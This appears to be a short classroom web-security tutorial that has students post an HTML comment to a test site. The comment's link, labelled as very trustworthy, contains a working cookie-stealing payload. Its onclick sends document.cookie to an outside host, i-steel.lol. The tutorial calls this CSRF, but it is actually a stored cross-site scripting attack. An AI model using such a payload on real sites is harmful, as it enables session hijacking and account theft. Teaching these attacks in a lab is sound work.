# CSRF Tutorial

#### 0. (optional) Switch the branch 
```console
git stash
```
```console
git checkout [branch]
```

### 1. Use CSRF to create a link pointing to another site
- Write the following comment:
```html
<a href="#" onclick="window.location.href = \'http://i-steel.lol/?tokens=\' + encodeURIComponent(document.cookie)">sehr vertrauenswürdig</a>
<br/>
<a href="#" onclick="window.location.href = \'https://hszg.de\'">link</a>
```
